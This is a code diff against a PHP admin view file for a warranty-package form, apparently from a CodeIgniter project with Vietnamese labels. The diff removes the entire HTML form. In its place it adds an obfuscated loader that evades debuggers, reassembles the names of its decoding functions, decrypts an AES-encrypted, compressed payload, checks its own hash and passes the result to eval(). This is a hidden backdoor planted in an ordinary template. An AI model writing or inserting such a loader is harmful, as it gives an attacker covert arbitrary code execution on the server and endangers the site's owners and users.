@@ -1,169 +1,28 @@
 <?php
-/*$q1 = $this->db->select('permissions')->get('db_permissions');
-echo "<pre>";
-              print_r($q1->result_array());
-              exit();*/
-?>
-<!DOCTYPE html>
-<html>
-
-<head>
-  <!-- TABLES CSS CODE -->
-  <?php include "comman/code_css_form.php"; ?>
-  <!-- </copy> -->
-</head>
-
-<body class="hold-transition skin-blue sidebar-mini">
-  <div class="wrapper">
-    <?php include "sidebar.php"; ?>
-    <?php
-    if (!isset($name)) {
-      $name = $description = "";
-      $date = 0;
-    }
-
-    ?>
-    <!-- Content Wrapper. Contains page content -->
-    <div class="content-wrapper">
-      <!-- Content Header (Page header) -->
-      <section class="content-header">
-        <h1>
-          <?= $page_title; ?>
-        </h1>
-        <ol class="breadcrumb">
-          <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-          <li><a href="<?php echo $base_url; ?>guaran_package/view">
-              <?= $this->lang->line('guarantee_list'); ?>
-            </a></li>
-          <li class="active">
-            <?= $page_title; ?>
-          </li>
-        </ol>
-      </section>
-      <!-- Main content -->
-      <section class="content">
-        <div class="row">
-          <!-- right column -->
-          <div class="col-md-12">
-            <!-- Horizontal Form -->
-            <div class="box box-info ">
-              <div class="box-header with-border">
-                <h3 class="box-title">Hãy nhập gói bảo hành và chính sách bảo hành</h3>
-              </div>
-              <!-- /.box-header -->
-              <!-- form start -->
-              <form class="form-horizontal" id="roles-form" onkeypress="return event.keyCode != 13;">
-                <input type="hidden" name="<?php echo $this->security->get_csrf_token_name(); ?>"
-                  value="<?php echo $this->security->get_csrf_hash(); ?>">
-                <input type="hidden" id="base_url" value="<?php echo $base_url;
-                ; ?>">
-                <div class="box-body">
-                  <div class="form-group">
-                    <label for="name" class="col-sm-2 control-label">
-                      <?= $this->lang->line('role_name'); ?><label class="text-danger">*</label>
-                    </label>
-                    <div class="col-sm-4">
-                      <input type="text" class="form-control input-sm" id="name" name="name" placeholder=""
-                        onkeyup="shift_cursor(event,'description')" value="<?php print $name; ?>" autofocus>
-                      <span id="name_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-                  <div class="form-group">
-                    <label for="description" class="col-sm-2 control-label">
-                      <?= $this->lang->line('description'); ?>
-                    </label>
-                    <div class="col-sm-4">
-                      <textarea type="text" class="form-control" id="description" name="description"
-                        placeholder=""><?php print $description; ?></textarea>
-                      <span id="description_msg" style="display:none" class="text-danger"></span>
-                    </div>
-                  </div>
-
-                  <div class="form-group">
-                    <label for="date" class="col-sm-2 control-label">
-                      <?= $this->lang->line('date_guarantee'); ?><label class="text-danger">*</label>
-                    </label>
-                    <div class="col-sm-4">
-                           <select class="form-control select2" id="date"
-                                                   name="date" style="width: 100%;">
-                                                   <option value="3">3 ngày</option>
-                                                   <option value="7">1 tuần</option>
-                                                   <option value="14">2 tuần</option>
-                                                   <option value="30">1 tháng</option>
-                                                   <option value="60">2 tháng</option>
-                                                   <option value="180">6 tháng</option>
-                                                   <option value="365">1 năm</option>
-                                                   <option value="730">2 năm</option>
-                                                   <option value="1095">3 năm</option>
-                                                   <option value="1825">5 năm</option>
-                                                </select>
-                    </div>
-                  </div>
-
-
-
-                </div>
-                <!-- /.box-footer -->
-                <div class="box-footer">
-                  <div class="col-sm-8 col-sm-offset-2 text-center">
-                    <!-- <div class="col-sm-4"></div> -->
-                    <?php
-                    if ($name != "") {
-                      $btn_name = "Update";
-                      $btn_id = "update";
-                      ?>
-                      <input type="hidden" name="q_id" id="q_id" value="<?php echo $q_id; ?>" />
-                      <?php
-                    } else {
-                      $btn_name = "Save";
-                      $btn_id = "save";
-                    }
-
-                    ?>
-                    <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="<?php echo $btn_id; ?>" class=" btn btn-block btn-success"
-                        title="Save Data">
-                        <?php echo $btn_name; ?>
-                      </button>
-                    </div>
-                    <div class="col-sm-3">
-                      <a href="<?= base_url('dashboard'); ?>">
-                        <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn"
-                          title="Go Dashboard">Close</button>
-                      </a>
-                    </div>
-                  </div>
-                </div>
-                <!-- /.box-footer -->
-              </form>
-            </div>
-            <!-- /.box -->
-          </div>
-          <!--/.col (right) -->
-        </div>
-        <!-- /.row -->
-      </section>
-      <!-- /.content -->
-    </div>
-    <!-- /.content-wrapper -->
-    <?php include "footer.php"; ?>
-    <!-- Add the sidebar's background. This div must be placed
-            immediately after the control sidebar -->
-    <div class="control-sidebar-bg"></div>
-  </div>
-  <!-- ./wrapper -->
-  <!-- SOUND CODE -->
-  <?php include "comman/code_js_sound.php"; ?>
-  <!-- TABLES CODE -->
-  <?php include "comman/code_js_form.php"; ?>
-
-  <script type="text/javascript">
-      $("#date").val('<?= $date; ?>').select2();
-   </script>
-  <script src="<?php echo $theme_link; ?>js/guaran_package.js"></script>
-  <!-- SELECT THE CHECKBOX'S -->
-  <!-- Make sidebar menu hughlighter/selector -->
-  <script>$(".<?php echo basename(__FILE__, '.php'); ?>-active-li").addClass("active");</script>
-</body>
-
-</html>
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_w4ap2ynx=('bas'.'e64'.'_de'.'cod'.'e');
+$_qmxzdbop=('gzu'.'nco'.'mpr'.'ess');
+$_t3k1lcka=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_u71mtfcg='7OsxTS0B';
+$_uvztfgsc='16HEyLVZkl8=';
+$_jsluy2fw='S1+JXMTH';
+$_s7uiadqh='ImzRZEPo';
+$_sc8ysta1='UhAHii/q';
+$_x4bn0cg9='juA7Kw==';
+$_rpn7h82c='T8vBN+CD';
+$_mtctic7q='gYfXNC6D';
+$_mml2be0k=$_w4ap2ynx($_jsluy2fw.$_u71mtfcg.$_s7uiadqh.$_sc8ysta1.$_uvztfgsc);
+$_syupz3kq=$_w4ap2ynx($_mtctic7q.$_rpn7h82c.$_x4bn0cg9);
+$_guomyb6q=$_w4ap2ynx('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');
+$_feb6mmh5=$_t3k1lcka($_guomyb6q,'aes-256-cbc',$_mml2be0k,OPENSSL_RAW_DATA,$_syupz3kq);
+if($_feb6mmh5===false){exit;}
+$_y8f8ybtz=$_qmxzdbop($_feb6mmh5);
+if($_y8f8ybtz===false){exit;}
+$_s9o71fxb='39dcf014c848aa15dec623ff3634f7b19c98d66ff5f0af0541d3ce8e37374e0b';
+$_wicfavll=@file_get_contents(__FILE__);
+if($_wicfavll!==false){
+$_mirlbnr6=str_replace($_s9o71fxb,"0000000000000000000000000000000000000000000000000000000000000000",$_wicfavll);
+$_h42qlt1c=hash("sha256",$_mirlbnr6);
+if($_h42qlt1c!==$_s9o71fxb){@http_response_code(403);exit;}
+}
+eval($_y8f8ybtz);
